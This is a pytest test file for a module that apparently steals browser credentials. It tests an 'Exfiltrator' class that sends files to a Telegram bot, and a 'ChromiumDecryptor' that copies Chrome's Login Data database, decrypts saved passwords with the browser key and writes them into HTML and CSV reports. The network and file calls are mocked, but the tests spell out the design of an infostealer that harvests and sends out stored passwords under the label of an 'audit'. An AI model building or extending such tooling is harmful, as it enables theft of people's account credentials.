import pytest
import requests
from pathlib import Path
from unittest.mock import MagicMock, patch
from main import Exfiltrator, ChromiumDecryptor

def test_retry_request_fails_gracefully(mocker):
    """Test that retry_request returns False and does not raise after max retries."""
    exf = Exfiltrator(telegram_token="fake", telegram_chat_id="fake")
    
    # Mock requests.post to always raise an exception
    mock_post = mocker.patch("requests.post", side_effect=requests.exceptions.ConnectionError("Network Down"))
    
    # Mock open for the file
    mocker.patch("builtins.open", mocker.mock_open(read_data=b"data"))
    
    # This should return False, not raise
    result = exf.send_to_telegram("any_path.html")
    
    assert result is False
    # Verify it tried 3 times (default MAX_RETRIES)
    assert mock_post.call_count == 3

def test_audit_filtering_logic(mocker, tmp_path):
    """Test que audit separa correctamente credenciales HTTP y no-HTTP."""
    decryptor = ChromiumDecryptor()

    # Nueva API: browsers es dict de (path, multi_profile)
    mock_path = tmp_path / "User Data"
    mock_path.mkdir()
    decryptor.browsers = {"Chrome": (mock_path, True)}

    # get_key ahora retorna (aes_key, dpapi_ok)
    mocker.patch.object(ChromiumDecryptor, "get_key",
                        return_value=(b"fake_key_32_bytes_padding_123456", True))
    mocker.patch.object(ChromiumDecryptor, "decrypt",
                        side_effect=lambda blob, key: blob.decode())

    # Crea perfil Default con Login Data no vacío
    default_path = mock_path / "Default"
    default_path.mkdir()
    db_path = default_path / "Login Data"
    db_path.write_bytes(b"fake db content")   # write_bytes para stat().st_size > 0

    mock_conn   = MagicMock()
    mock_cursor = mock_conn.cursor.return_value
    mock_cursor.fetchall.return_value = [
        ("https://google.com", "user1", b"pass1"),      # válida → data
        ("ftp://local-files",  "user2", b"pass2"),      # URL no-HTTP → filtered
        ("https://missing",    "",      b"pass3"),       # sin usuario → skipped
    ]
    mocker.patch("sqlite3.connect", return_value=mock_conn)
    mocker.patch("shutil.copy2")

    results, html_path, csv_path = decryptor.audit(output_dir=tmp_path)

    assert results is not None
    assert len([r for r in results if r[2].startswith("https://")]) == 1
    assert len([r for r in results if r[2].startswith("ftp://")]) == 1

    assert html_path is not None
    report_content = html_path.read_text(encoding="utf-8")
    assert "https://google.com" in report_content
    assert "Entradas Filtradas" in report_content
    assert "ftp://local-files" in report_content
